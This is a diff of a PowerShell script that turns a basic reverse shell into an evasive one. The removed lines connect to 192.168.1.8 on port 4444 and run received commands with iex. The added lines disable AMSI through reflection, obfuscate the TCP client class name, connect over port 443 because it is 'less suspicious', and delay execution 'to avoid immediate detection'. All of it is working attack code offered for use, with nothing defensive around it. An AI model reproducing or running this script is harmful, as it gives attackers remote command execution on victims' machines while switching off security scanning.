@@ -1,12 +1,27 @@
-$client = New-Object System.Net.Sockets.TCPClient("192.168.1.8",4444)
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-    $sendback = (iex $data 2>&1 | Out-String )
-    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-    $stream.Write($sendbyte,0,$sendbyte.Length)
-    $stream.Flush()
+# STEP 1: Bypass AMSI first
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# STEP 2: Use obfuscated reverse shell over common port
+function Execute-ReverseShell {
+    $s = ("System.Net.Sockets.TCPClient").Replace('System.','')
+    $h = "192.168.1.8"
+    $p = 443  # HTTPS port - less suspicious
+    
+    $c = New-Object $s($h,$p)
+    $st = $c.GetStream()
+    [byte[]]$b = 0..65535|%{0}
+    
+    while(($i = $st.Read($b,0,$b.Length)) -ne 0) {
+        $d = (New-Object -TypeName ("System.Text.ASCIIEncoding")).GetString($b,0,$i)
+        $sb = (IEX $d 2>&1 | & { process { $_.ToString() } } | Out-String)
+        $sb2 = $sb + 'PS ' + (Get-Location).Path + '> '
+        $sbyt = ([text.encoding]::ASCII).GetBytes($sb2)
+        $st.Write($sbyt,0,$sbyt.Length)
+        $st.Flush()
+    }
+    $c.Close()
 }
-$client.Close()
+
+# STEP 3: Execute with delay to avoid immediate detection
+Start-Sleep -Seconds 5
+Execute-ReverseShell
